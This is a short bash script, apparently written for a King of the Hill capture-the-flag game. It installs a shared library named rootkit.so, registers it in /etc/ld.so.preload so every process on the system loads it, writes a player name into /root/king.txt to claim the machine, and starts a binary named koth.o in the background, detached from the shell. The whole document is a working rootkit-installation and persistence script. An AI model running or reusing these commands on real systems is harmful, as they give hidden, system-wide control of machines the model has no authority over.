#!/bin/bash

sudo cp ./rootkit.so /usr/local/lib/rootkit.so
echo /usr/local/lib/rootkit.so > /etc/ld.so.preload
echo profxadke > /root/king.txt
./koth.o & disown
